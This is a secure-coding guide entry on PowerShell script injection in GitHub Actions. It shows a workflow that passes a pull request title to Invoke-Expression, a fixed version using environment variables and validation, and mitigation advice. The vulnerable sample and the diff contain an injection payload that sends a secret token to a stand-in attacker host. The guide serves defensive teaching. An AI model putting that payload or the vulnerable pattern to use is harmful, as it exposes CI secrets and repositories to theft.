# Script Injection

## Description

Workflows that use user-controlled input in dangerous PowerShell operations (Invoke-Expression, Invoke-Command, call operators) are vulnerable to script injection: attackers can inject malicious PowerShell commands that execute with the workflow's permissions, enabling secret exfiltration, file modification, or system compromise. PowerShell injection is particularly dangerous because injected commands run with full workflow permissions and can access secrets, modify repository contents, or perform unauthorized actions. [^gh_actions_security]

## Vulnerable Instance

- Workflow uses user input (from pull request titles, issue comments, or workflow inputs) directly in PowerShell commands.
- Input is used with Invoke-Expression, Invoke-Command, or call operators without validation.
- Attacker can inject malicious PowerShell code.

```yaml
name: Process PR Title
on:
  pull_request:
jobs:
  process:
    runs-on: windows-latest
    steps:
      - name: Process input
        shell: powershell
        run: |
          Invoke-Expression "${{ github.event.pull_request.title }}"
          # Attacker can inject: "; curl attacker.com/steal?token=$SECRET; #"
```

## Mitigation Strategies

1. **Use environment variables**  
   Pass user input through environment variables instead of direct string interpolation. Access via `$env:VARIABLE_NAME` in PowerShell.

2. **Use PowerShell parameters**  
   Use `-ParameterName` syntax and proper parameter binding. Avoid string interpolation in commands and validate all inputs.

3. **Validate and sanitize inputs**  
   Validate input types and formats, sanitize special characters, and use allowlists for permitted values. Reject inputs that don't match expected patterns.

4. **Avoid dangerous patterns**  
   Never use Invoke-Expression, Invoke-Command, call operators (`&`), or dot sourcing (`.`) with user input. Use parameterized commands and proper quoting.

5. **Use safe PowerShell practices**  
   Prefer cmdlets over direct command execution. Use `-WhatIf` for destructive operations. Implement input validation at workflow and script levels.

6. **Review all PowerShell usage**  
   Audit all PowerShell scripts in workflows for injection risks. Require code review for any workflow changes involving user input and PowerShell.

### Secure Version

```diff
 name: Process PR Title Safely
 on:
   pull_request:
 jobs:
   process:
     runs-on: windows-latest
     steps:
       - name: Process input
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
         shell: powershell
         run: |
+          # Validate input
+          if ($env:PR_TITLE -notmatch '^[a-zA-Z0-9\s-]+$') {
+            Write-Error "Invalid input"
+            exit 1
+          }
-          Invoke-Expression "${{ github.event.pull_request.title }}"
-          # Attacker can inject: "; curl attacker.com/steal?token=$SECRET; #"
+          Write-Host $env:PR_TITLE  # Safe - no injection
```

## Impact

| Dimension | Severity | Notes |
| --- | --- | --- |
| Likelihood | ![Medium](https://img.shields.io/badge/-Medium-yellow?style=flat-square) | PowerShell injection requires user input in dangerous contexts, but is common when workflows process PR titles, comments, or inputs. |
| Risk | ![Critical](https://img.shields.io/badge/-Critical-red?style=flat-square) | Injected PowerShell commands run with workflow permissions, enabling secret exfiltration, code modification, or full system compromise. |
| Blast radius | ![Wide](https://img.shields.io/badge/-Wide-yellow?style=flat-square) | Compromised workflows can affect all systems the workflow can access, including repositories, secrets, and deployment targets. |

## References

- GitHub Docs, "Security hardening for GitHub Actions," https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions [^gh_actions_security]

---

[^gh_actions_security]: GitHub Docs, "Security hardening for GitHub Actions," https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
